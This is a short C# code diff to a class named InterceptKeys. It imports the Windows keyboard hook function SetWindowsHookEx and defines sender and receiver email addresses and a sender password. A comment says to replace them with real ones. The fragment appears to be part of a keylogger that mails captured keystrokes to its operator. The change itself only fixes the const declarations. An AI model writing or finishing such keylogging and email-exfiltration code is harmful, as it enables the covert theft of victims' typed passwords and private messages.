@@ -20,9 +20,9 @@ class InterceptKeys
     private static IntPtr _hookID = IntPtr.Zero;
 
     // You have to modify these to actual addresses and password
-    private static const string senderEmail = "fakemail@gmail.com";
-    private static const string receiverEmail = "realmail@yourdomain.com";
-    private static const string senderPassword = "P4s5w0rd";
+    private const string senderEmail = "fakemail@gmail.com";
+    private const string receiverEmail = "realmail@yourdomain.com";
+    private const string senderPassword = "P4s5w0rd";
 
     [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
     private static extern IntPtr SetWindowsHookEx(int idHook,
